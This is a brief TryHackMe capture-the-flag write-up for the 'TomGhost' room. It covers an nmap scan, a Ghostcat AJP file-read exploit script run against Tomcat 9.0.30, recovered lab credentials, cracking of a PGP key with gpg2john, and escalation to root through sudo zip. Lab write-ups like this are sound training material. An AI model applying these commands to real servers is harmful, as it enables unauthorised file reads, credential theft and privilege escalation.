# TomGhost-TryHackMe
scanning

22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)

|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)

|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)

53/tcp   open  tcpwrapped

8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)

| ajp-methods: 

|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http       Apache Tomcat 9.0.30

|_http-title: Apache Tomcat/9.0.30

|_http-favicon: Apache Tomcat

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Search on google of tomcat and apache jserv version(try to enumerate apache jserv and find web-inf/web.xml

{https://github.com/doggycheng/CNVD-2020-10487} 

python CNVD-2020-10487-Tomcat-Ajp-lfi.py -f /WEB-INF/web.xml ip

#found username
username==1
skyfuck:8730281lkjlkjdqlksalks

found user.txt

try to enumerate the two credentials file

gpg --import tryhackme.asc

#copy .asc file to own computer
scp skyfuck@10.10.94.147:tryhackme.asc /tmp

gpg2john tryhackme.asc > /tmp/hash

gpg --decrypt credential.pgp


username==2
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

sudo -l
/usr/bin/zip--- which is root access

I got root and finally go to bed:)
